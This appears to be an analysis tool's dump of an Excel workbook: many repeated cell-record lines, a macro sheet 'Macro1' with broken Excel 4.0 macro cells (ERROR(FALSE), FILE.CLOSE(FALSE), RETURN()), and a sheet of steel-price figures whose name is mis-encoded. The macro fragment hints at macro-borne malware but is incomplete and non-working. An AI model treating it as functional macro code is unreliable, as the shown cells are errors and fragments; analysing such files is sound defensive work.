' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' Sheet,Reference,Formula,Value
' Macro1,A2,ERROR(FALSE),""
' Macro1,A3,"<ERROR>",""
' Macro1,A4,"<ERROR>",""
' Macro1,A5,FILE.CLOSE(FALSE),""
' Macro1,A6,*STACKERROR* not enough arguments for function: END.IF,""
' Macro1,A7,RETURN(),""
' ÖÐºñ°åµÍºÏ½ð,F7,"",22.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,H7,"",4600.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,F8,"",14.78200000000000002842
' ÖÐºñ°åµÍºÏ½ð,H8,"",4700.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,F9,"",8.26299999999999990052
' ÖÐºñ°åµÍºÏ½ð,F10,"",11.07799999999999940314
' ÖÐºñ°åµÍºÏ½ð,H10,"",4850.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,F11,"",11.23600000000000065370
' ÖÐºñ°åµÍºÏ½ð,H11,"",4850.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E12,"",7.46100000000000029843
' ÖÐºñ°åµÍºÏ½ð,G12,"",4800.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E13,"",6.43299999999999982947
' ÖÐºñ°åµÍºÏ½ð,G13,"",4800.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E14,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E15,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E16,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E17,"",4700.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E18,"",4800.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E19,"",4800.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L19,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N19,"",27.41001953125000056843
' ÖÐºñ°åµÍºÏ½ð,P19,"",4700.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E20,"",4800.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L20,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N20,"",27.64001953125000099476
' ÖÐºñ°åµÍºÏ½ð,P20,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L21,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N21,"",27.42001953124999857891
' ÖÐºñ°åµÍºÏ½ð,P21,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L22,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N22,"",27.33001953124999872102
' ÖÐºñ°åµÍºÏ½ð,P22,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L23,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N23,"",27.13001953124999943157
' ÖÐºñ°åµÍºÏ½ð,P23,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,D24,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E24,"",21.70400000000000062528
' ÖÐºñ°åµÍºÏ½ð,L24,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N24,"",27.62001953125000142109
' ÖÐºñ°åµÍºÏ½ð,P24,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L25,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N25,"",27.01001953124999843681
' ÖÐºñ°åµÍºÏ½ð,P25,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,D26,"",4580.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E26,"",32.55299999999999727152
' ÖÐºñ°åµÍºÏ½ð,L26,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N26,"",27.05001953125000113687
' ÖÐºñ°åµÍºÏ½ð,P26,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L27,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N27,"",27.40001953124999900524
' ÖÐºñ°åµÍºÏ½ð,P27,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,L28,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N28,"",26.98001953125000085265
' ÖÐºñ°åµÍºÏ½ð,P28,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,D29,"",4580.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E29,"",73.47599999999999909051
' ÖÐºñ°åµÍºÏ½ð,L29,"",1.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,N29,"",27.55001953125000113687
' ÖÐºñ°åµÍºÏ½ð,P29,"",4550.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,D30,"",4600.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E30,"",67.82399999999999806732
' ÖÐºñ°åµÍºÏ½ð,D32,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E32,"",52.75200000000000244427
' ÖÐºñ°åµÍºÏ½ð,D37,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E37,"",234.06590909090908780854
' ÖÐºñ°åµÍºÏ½ð,D39,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E39,"",133.25800000000000977707
' ÖÐºñ°åµÍºÏ½ð,D40,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E40,"",44.75600000000000022737
' ÖÐºñ°åµÍºÏ½ð,D41,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E41,"",203.95199999999999818101
' ÖÐºñ°åµÍºÏ½ð,D42,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E42,"",189.51800000000000068212
' ÖÐºñ°åµÍºÏ½ð,D43,"",4650.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E43,"",118.72400000000000375167
' ÖÐºñ°åµÍºÏ½ð,E48,"",4.99300000000000032685
' ÖÐºñ°åµÍºÏ½ð,F48,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E49,"",4.85599999999999987210
' ÖÐºñ°åµÍºÏ½ð,F49,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E50,"",2.95900000000000007461
' ÖÐºñ°åµÍºÏ½ð,F50,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E52,"",6.17900000000000027001
' ÖÐºñ°åµÍºÏ½ð,F52,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E53,"",6.43799999999999972289
' ÖÐºñ°åµÍºÏ½ð,F53,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB53,"",5400.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E54,"",6.43799999999999972289
' ÖÐºñ°åµÍºÏ½ð,F54,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB54,"",5150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,E55,"",6.43799999999999972289
' ÖÐºñ°åµÍºÏ½ð,F55,"",4150.00000000000000000000
' ÖÐºñ°åµÍºÏ½ð,GB55,"",5200.00000000000000000000
